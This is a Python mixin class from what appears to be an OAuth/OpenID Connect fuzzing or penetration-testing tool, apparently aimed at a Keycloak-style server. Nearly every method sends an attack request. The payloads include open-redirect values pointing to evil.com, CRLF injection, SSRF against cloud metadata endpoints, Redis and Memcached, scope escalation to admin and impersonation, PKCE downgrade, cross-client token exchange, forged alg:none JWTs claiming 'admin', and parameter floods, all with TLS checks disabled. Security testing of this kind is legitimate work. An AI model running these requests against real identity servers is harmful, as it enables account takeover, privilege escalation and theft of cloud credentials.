#!/usr/bin/env python3
"""[Target]-specific OAuth protocol methods."""

import re
import html
import json
import random
import urllib.parse
import requests
import base64
from typing import Tuple, Dict


class AttackProtocolMixin:
    """[Target]-specific protocol methods mixed into OAuthProtocol."""

     # ====== NEW PROTOCOL METHODS FOR ENHANCED FUZZING ======

    def authorize_implicit(self, **kwargs) -> Tuple[str, requests.Response]:
        """Implicit grant (response_type=token) - should be blocked or deprecated"""
        self._ensure_state_pkce()
        params = {
            'response_type': 'token',
            'client_id': self.config.client_id,
            'redirect_uri': kwargs.get('redirect_uri', self.config.redirect_uri),
            'scope': kwargs.get('scope', self.config.scope),
            'state': self.state,
            'nonce': self.nonce,
        }
        url = f"{self.auth_endpoint}?{urllib.parse.urlencode(params)}"
        self._track_request('GET', url, self.session.headers)
        response = self.session.get(url, allow_redirects=False)
        self._track_response(response)
        return 'authorize_implicit', response

    def authorize_hybrid(self, **kwargs) -> Tuple[str, requests.Response]:
        """Hybrid flow: code + token"""
        self._ensure_state_pkce()
        params = {
            'response_type': kwargs.get('response_type', 'code token'),
            'client_id': self.config.client_id,
            'redirect_uri': kwargs.get('redirect_uri', self.config.redirect_uri),
            'scope': kwargs.get('scope', self.config.scope),
            'state': self.state,
            'nonce': self.nonce,
            'code_challenge': self.code_challenge,
            'code_challenge_method': 'S256'
        }
        url = f"{self.auth_endpoint}?{urllib.parse.urlencode(params)}"
        self._track_request('GET', url, self.session.headers)
        response = self.session.get(url, allow_redirects=False)
        self._track_response(response)
        
        if response.status_code in (302, 303):
            self.login_form_url = response.headers.get('Location', None)
        else:
            self.login_form_url = response.url or self.login_form_url
        
        return 'authorize_hybrid', response

    def authorize_hybrid_idtoken(self, **kwargs) -> Tuple[str, requests.Response]:
        """Hybrid flow: code + id_token"""
        return self.authorize_hybrid(response_type='code id_token', **kwargs)

    def authorize_open_redirect(self, **kwargs) -> Tuple[str, requests.Response]:
        """Test for open redirect vulnerabilities"""
        self._ensure_state_pkce()
        
        # Malicious redirect URIs to test
        malicious_uris = [
            'https://evil.com/callback',
            f'http://{urllib.parse.urlparse(self.config.redirect_uri).netloc}@evil.com/callback',
            f'{self.config.redirect_uri}/../../../etc/passwd',
            'javascript:alert(1)',
            '//evil.com/callback',
            f'//{urllib.parse.urlparse(self.config.redirect_uri).netloc}@evil.com',
            f'{self.config.redirect_uri}?next=https://evil.com',
            f'{self.config.redirect_uri}\r\nX-Injected: evil',
            f'https://evil.com#{self.config.redirect_uri}',
        ]
        
        params = {
            'response_type': 'code',
            'client_id': self.config.client_id,
            'redirect_uri': kwargs.get('redirect_uri', random.choice(malicious_uris)),
            'scope': kwargs.get('scope', self.config.scope),
            'state': self.state,
            'nonce': self.nonce,
        }
        url = f"{self.auth_endpoint}?{urllib.parse.urlencode(params)}"
        self._track_request('GET', url, self.session.headers)
        response = self.session.get(url, allow_redirects=False)
        self._track_response(response)
        return 'authorize_open_redirect', response

    def authorize_redirect_ssrf(self, **kwargs) -> Tuple[str, requests.Response]:
        """Test for SSRF via redirect_uri"""
        self._ensure_state_pkce()
        
        ssrf_uris = [
            'http://localhost/callback',
            'http://127.0.0.1/callback',
            'http://0.0.0.0/callback',
            'http://[::1]/callback',
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'http://metadata.google.internal/',  # GCP metadata
            'http://localhost:6379/',  # Redis
            'http://localhost:11211/',  # Memcached
        ]
        
        params = {
            'response_type': 'code',
            'client_id': self.config.client_id,
            'redirect_uri': kwargs.get('redirect_uri', random.choice(ssrf_uris)),
            'scope': kwargs.get('scope', self.config.scope),
            'state': self.state,
        }
        url = f"{self.auth_endpoint}?{urllib.parse.urlencode(params)}"
        self._track_request('GET', url, self.session.headers)
        response = self.session.get(url, allow_redirects=False)
        self._track_response(response)
        return 'authorize_redirect_ssrf', response

    def authorize_scope_escalation(self, **kwargs) -> Tuple[str, requests.Response]:
        """Test for scope escalation vulnerabilities"""
        self._ensure_state_pkce()
        
        # Request more scopes than should be allowed
        escalated_scopes = [
            'openid profile email admin',
            'openid profile email manage-users',
            'openid profile email offline_access roles',
            'openid profile email manage-realm',
            'openid profile email impersonation',
        ]
        
        params = {
            'response_type': 'code',
            'client_id': self.config.client_id,
            'redirect_uri': self.config.redirect_uri,
            'scope': kwargs.get('scope', random.choice(escalated_scopes)),
            'state': self.state,
            'nonce': self.nonce,
            'code_challenge': self.code_challenge,
            'code_challenge_method': 'S256'
        }
        url = f"{self.auth_endpoint}?{urllib.parse.urlencode(params)}"
        self._track_request('GET', url, self.session.headers)
        response = self.session.get(url, allow_redirects=False)
        self._track_response(response)
        
        if response.status_code in (302, 303):
            self.login_form_url = response.headers.get('Location', None)
        
        return 'authorize_scope_escalation', response

    def authorize_scope_admin(self, **kwargs) -> Tuple[str, requests.Response]:
        """Specifically test for admin scope access"""
        return self.authorize_scope_escalation(scope='openid profile email admin manage-realm realm-admin', **kwargs)

    def authorize_pkce_method_confusion(self, **kwargs) -> Tuple[str, requests.Response]:
        """Test PKCE method confusion (S256 challenge with plain method claim)"""
        self._ensure_state_pkce()
        
        # S256 encoded challenge but claiming plain method
        params = {
            'response_type': 'code',
            'client_id': self.config.client_id,
            'redirect_uri': self.config.redirect_uri,
            'scope': kwargs.get('scope', self.config.scope),
            'state': self.state,
            'nonce': self.nonce,
            'code_challenge': self.code_challenge,  # S256 encoded
            'code_challenge_method': 'plain'  # But claiming plain
        }
        url = f"{self.auth_endpoint}?{urllib.parse.urlencode(params)}"
        self._track_request('GET', url, self.session.headers)
        response = self.session.get(url, allow_redirects=False)
        self._track_response(response)
        
        if response.status_code in (302, 303):
            self.login_form_url = response.headers.get('Location', None)
        
        return 'authorize_pkce_method_confusion', response

    def token_exchange_no_pkce(self, **kwargs) -> Tuple[str, requests.Response]:
        """Token exchange without code_verifier (PKCE downgrade test)"""
        token_data = {
            'grant_type': kwargs.get('grant_type', 'authorization_code'),
            'code': kwargs.get('code', self.auth_code),
            'redirect_uri': self.config.redirect_uri,
            'client_id': self.config.client_id,
            # Deliberately omit code_verifier
        }
        
        if self.config.client_secret:
            token_data['client_secret'] = kwargs.get('client_secret', self.config.client_secret)
        
        headers = self.session.headers.copy()
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        
        self._track_request('POST', self.token_endpoint, headers, token_data)
        response = self.session.post(self.token_endpoint, data=token_data, headers=headers)
        self._track_response(response)
        
        if response.status_code == 200:
            try:
                token_response = response.json()
                self.access_token = token_response.get('access_token')
                self.refresh_token_value = token_response.get('refresh_token')
                self.id_token = token_response.get('id_token')
            except:
                pass
        
        return 'token_exchange_no_pkce', response

    def token_exchange_wrong_client(self, **kwargs) -> Tuple[str, requests.Response]:
        """Token exchange with different client_id (cross-client attack)"""
        wrong_clients = ['other-client', 'admin-cli', 'account', 'broker', 'realm-management']
        
        token_data = {
            'grant_type': kwargs.get('grant_type', 'authorization_code'),
            'code': kwargs.get('code', self.auth_code),
            'redirect_uri': self.config.redirect_uri,
            'client_id': kwargs.get('wrong_client_id', random.choice(wrong_clients)),
            'code_verifier': self.code_verifier
        }
        
        if self.config.client_secret:
            token_data['client_secret'] = kwargs.get('client_secret', self.config.client_secret)
        
        headers = self.session.headers.copy()
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        
        self._track_request('POST', self.token_endpoint, headers, token_data)
        response = self.session.post(self.token_endpoint, data=token_data, headers=headers)
        self._track_response(response)
        
        return 'token_exchange_wrong_client', response

    def token_exchange_invalid_client(self, **kwargs) -> Tuple[str, requests.Response]:
        """Token exchange with non-existent client (for timing analysis)"""
        token_data = {
            'grant_type': 'client_credentials',
            'client_id': 'nonexistent-client-12345',
            'client_secret': 'any-secret'
        }
        
        headers = self.session.headers.copy()
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        
        self._track_request('POST', self.token_endpoint, headers, token_data)
        response = self.session.post(self.token_endpoint, data=token_data, headers=headers)
        self._track_response(response)
        
        return 'token_exchange_invalid_client', response

    def use_refresh_as_access(self, **kwargs) -> Tuple[str, requests.Response]:
        """Try using refresh_token as access_token (token confusion attack)"""
        token = kwargs.get('token', self.refresh_token_value)
        
        headers = self.session.headers.copy()
        if token:
            headers['Authorization'] = f'Bearer {token}'
        headers['Accept'] = 'application/json'
        
        self._track_request('GET', self.userinfo_endpoint, headers)
        response = self.session.get(self.userinfo_endpoint, headers=headers)
        self._track_response(response)
        
        return 'use_refresh_as_access', response

    def use_id_token_as_access(self, **kwargs) -> Tuple[str, requests.Response]:
        """Try using id_token as access_token (token confusion attack)"""
        token = kwargs.get('token', self.id_token)
        
        headers = self.session.headers.copy()
        if token:
            headers['Authorization'] = f'Bearer {token}'
        headers['Accept'] = 'application/json'
        
        self._track_request('GET', self.userinfo_endpoint, headers)
        response = self.session.get(self.userinfo_endpoint, headers=headers)
        self._track_response(response)
        
        return 'use_id_token_as_access', response

    def pushed_authorization_request(self, **kwargs) -> Tuple[str, requests.Response]:
        """PAR endpoint testing (RFC 9126)"""
        self._ensure_state_pkce()
        
        par_endpoint = f"{self.config.base_url}/realms/{self.config.realm}/protocol/openid-connect/ext/par/request"
        
        data = {
            'response_type': 'code',
            'client_id': self.config.client_id,
            'redirect_uri': self.config.redirect_uri,
            'scope': kwargs.get('scope', self.config.scope),
            'state': self.state,
            'nonce': self.nonce,
            'code_challenge': self.code_challenge,
            'code_challenge_method': 'S256'
        }
        
        if self.config.client_secret:
            data['client_secret'] = kwargs.get('client_secret', self.config.client_secret)
        
        headers = self.session.headers.copy()
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        
        self._track_request('POST', par_endpoint, headers, data)
        response = self.session.post(par_endpoint, data=data, headers=headers)
        self._track_response(response)
        
        # Store request_uri for subsequent authorize call
        if response.status_code == 201:
            try:
                par_response = response.json()
                self.par_request_uri = par_response.get('request_uri')
            except:
                pass
        
        return 'pushed_authorization_request', response

    def authorize_par(self, **kwargs) -> Tuple[str, requests.Response]:
        """Authorize using PAR request_uri"""
        request_uri = kwargs.get('request_uri', getattr(self, 'par_request_uri', None))
        
        if not request_uri:
            # Return error response if no request_uri
            err = requests.Response()
            err.status_code = 400
            err._content = b'{"error": "no_request_uri"}'
            return 'authorize_par', err
        
        params = {
            'client_id': self.config.client_id,
            'request_uri': request_uri
        }
        
        url = f"{self.auth_endpoint}?{urllib.parse.urlencode(params)}"
        self._track_request('GET', url, self.session.headers)
        response = self.session.get(url, allow_redirects=False)
        self._track_response(response)
        
        if response.status_code in (302, 303):
            self.login_form_url = response.headers.get('Location', None)
        
        return 'authorize_par', response

    # ── Generic edge-case attack methods (cross-target) ─────────────

    def token_exchange_xml(self, **kwargs) -> Tuple[str, requests.Response]:
        """Token exchange with Content-Type: application/xml instead of form-urlencoded."""
        data = {
            'grant_type': kwargs.get('grant_type', 'authorization_code'),
            'code': self.auth_code or kwargs.get('code', ''),
            'redirect_uri': self.config.redirect_uri,
            'client_id': self.config.client_id,
            'client_secret': self.config.client_secret,
        }
        if self.code_verifier:
            data['code_verifier'] = self.code_verifier
        try:
            r = self.session.post(self.token_endpoint, data=data, timeout=10, verify=False,
                                  headers={'Content-Type': 'application/xml'})
            self._track_request('POST', self.token_endpoint, {'Content-Type': 'application/xml'})
            self._track_response(r)
            return 'token_exchange_xml', r
        except Exception as e:
            return 'token_exchange_xml_error', self._synthetic_response(500, str(e))

    def token_exchange_null_content_type(self, **kwargs) -> Tuple[str, requests.Response]:
        """Token exchange with empty Content-Type header."""
        data = {
            'grant_type': kwargs.get('grant_type', 'authorization_code'),
            'code': self.auth_code or kwargs.get('code', ''),
            'redirect_uri': self.config.redirect_uri,
            'client_id': self.config.client_id,
            'client_secret': self.config.client_secret,
        }
        if self.code_verifier:
            data['code_verifier'] = self.code_verifier
        try:
            r = self.session.post(self.token_endpoint, data=data, timeout=10, verify=False,
                                  headers={'Content-Type': ''})
            self._track_request('POST', self.token_endpoint, {'Content-Type': '(empty)'})
            self._track_response(r)
            return 'token_exchange_null_ct', r
        except Exception as e:
            return 'token_exchange_null_ct_error', self._synthetic_response(500, str(e))

    def token_exchange_param_flood(self, **kwargs) -> Tuple[str, requests.Response]:
        """Token exchange with 500+ repeated parameters to test parameter handling."""
        data = {
            'grant_type': kwargs.get('grant_type', 'authorization_code'),
            'code': self.auth_code or kwargs.get('code', ''),
            'redirect_uri': self.config.redirect_uri,
            'client_id': self.config.client_id,
            'client_secret': self.config.client_secret,
        }
        if self.code_verifier:
            data['code_verifier'] = self.code_verifier
        # Flood with repeated parameters
        flood_count = kwargs.get('flood_count', 500)
        for i in range(flood_count):
            data[f'extra_param_{i}'] = f'flood_value_{i}'
        try:
            r = self.session.post(self.token_endpoint, data=data, timeout=30, verify=False)
            self._track_request('POST', self.token_endpoint, {'Content-Type': 'application/x-www-form-urlencoded'})
            self._track_response(r)
            return 'token_exchange_param_flood', r
        except Exception as e:
            return 'token_exchange_param_flood_error', self._synthetic_response(500, str(e))

    def user_info_jwt_alg_none(self, **kwargs) -> Tuple[str, requests.Response]:
        """UserInfo request with alg:none JWT as Bearer token."""
        import base64, json
        # Construct a JWT with alg:none
        header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b'=').decode()
        payload = base64.urlsafe_b64encode(json.dumps({"sub": "admin", "iss": "test", "aud": "test"}).encode()).rstrip(b'=').decode()
        fake_jwt = f"{header}.{payload}."
        try:
            r = self.session.get(self.userinfo_endpoint, timeout=10, verify=False,
                                headers={'Authorization': f'Bearer {fake_jwt}'})
            self._track_request('GET', self.userinfo_endpoint, {'Authorization': 'Bearer <alg:none JWT>'})
            self._track_response(r)
            return 'user_info_jwt_alg_none', r
        except Exception as e:
            return 'user_info_jwt_alg_none_error', self._synthetic_response(500, str(e))

    def user_info_jwt_expired(self, **kwargs) -> Tuple[str, requests.Response]:
        """UserInfo request with expired JWT as Bearer token."""
        import base64, json, time
        header = base64.urlsafe_b64encode(json.dumps({"alg": "RS256", "typ": "JWT"}).encode()).rstrip(b'=').decode()
        payload = base64.urlsafe_b64encode(json.dumps({"sub": "admin", "exp": int(time.time()) - 3600}).encode()).rstrip(b'=').decode()
        fake_jwt = f"{header}.{payload}.fake_signature"
        try:
            r = self.session.get(self.userinfo_endpoint, timeout=10, verify=False,
                                headers={'Authorization': f'Bearer {fake_jwt}'})
            self._track_request('GET', self.userinfo_endpoint, {'Authorization': 'Bearer <expired JWT>'})
            self._track_response(r)
            return 'user_info_jwt_expired', r
        except Exception as e:
            return 'user_info_jwt_expired_error', self._synthetic_response(500, str(e))

    def user_info_jwt_wrong_sig(self, **kwargs) -> Tuple[str, requests.Response]:
        """UserInfo request with wrong-signature JWT as Bearer token."""
        import base64, json
        header = base64.urlsafe_b64encode(json.dumps({"alg": "RS256", "typ": "JWT"}).encode()).rstrip(b'=').decode()
        payload = base64.urlsafe_b64encode(json.dumps({"sub": "admin", "iss": "test"}).encode()).rstrip(b'=').decode()
        fake_jwt = f"{header}.{payload}.wrong_signature_bytes"
        try:
            r = self.session.get(self.userinfo_endpoint, timeout=10, verify=False,
                                headers={'Authorization': f'Bearer {fake_jwt}'})
            self._track_request('GET', self.userinfo_endpoint, {'Authorization': 'Bearer <wrong-sig JWT>'})
            self._track_response(r)
            return 'user_info_jwt_wrong_sig', r
        except Exception as e:
            return 'user_info_jwt_wrong_sig_error', self._synthetic_response(500, str(e))

    def introspect_empty_token(self, **kwargs) -> Tuple[str, requests.Response]:
        """Introspection with empty token string."""
        data = {
            'token': '',
            'client_id': self.config.client_id,
            'client_secret': self.config.client_secret,
        }
        try:
            r = self.session.post(self.introspect_endpoint, data=data, timeout=10, verify=False)
            self._track_request('POST', self.introspect_endpoint, {'Content-Type': 'application/x-www-form-urlencoded'})
            self._track_response(r)
            return 'introspect_empty_token', r
        except Exception as e:
            return 'introspect_empty_token_error', self._synthetic_response(500, str(e))

    def introspect_malformed(self, **kwargs) -> Tuple[str, requests.Response]:
        """Introspection with malformed token string."""
        data = {
            'token': '<<<not-a-valid-token>>>\x00\x01\x02',
            'client_id': self.config.client_id,
            'client_secret': self.config.client_secret,
        }
        try:
            r = self.session.post(self.introspect_endpoint, data=data, timeout=10, verify=False)
            self._track_request('POST', self.introspect_endpoint, {'Content-Type': 'application/x-www-form-urlencoded'})
            self._track_response(r)
            return 'introspect_malformed', r
        except Exception as e:
            return 'introspect_malformed_error', self._synthetic_response(500, str(e))

    def authorize_param_flood_100(self, **kwargs) -> Tuple[str, requests.Response]:
        """Authorization request with 100 repeated parameters."""
        params = {
            'response_type': kwargs.get('response_type', 'code'),
            'client_id': self.config.client_id,
            'redirect_uri': self.config.redirect_uri,
            'scope': kwargs.get('scope', self.config.scope),
            'state': kwargs.get('state', self.state),
        }
        if self.code_challenge:
            params['code_challenge'] = self.code_challenge
            params['code_challenge_method'] = kwargs.get('code_challenge_method', 'S256')
        if self.nonce:
            params['nonce'] = self.nonce
        # Flood with 100 repeated parameters
        for i in range(100):
            params[f'extra_{i}'] = f'flood_{i}'
        url = f"{self.auth_endpoint}?{urllib.parse.urlencode(params)}"
        try:
            r = self.session.get(url, allow_redirects=False, timeout=30, verify=False)
            self._track_request('GET', url, self.session.headers)
            self._track_response(r)
            self.last_location = r.headers.get('Location', '')
            return 'authorize_param_flood', r
        except Exception as e:
            return 'authorize_param_flood_error', self._synthetic_response(500, str(e))